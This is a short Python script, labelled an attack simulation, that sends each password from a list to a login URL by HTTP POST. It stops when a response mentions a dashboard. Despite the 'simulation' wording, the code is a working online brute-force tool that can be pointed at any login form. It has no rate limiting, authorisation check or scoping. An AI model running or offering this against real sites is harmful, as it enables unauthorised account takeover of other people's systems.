import requests

def simulate_bruteforce(url, username, password_list):

    print("Starting attack simulation...")

    for password in password_list:

        data = {
            "username": username,
            "password": password
        }

        r = requests.post(url, data=data)

        print(f"Trying {password} -> {r.status_code}")

        if "dashboard" in r.text.lower():
            print("Login bypass detected (weak system)")
            break

    print("Simulation complete")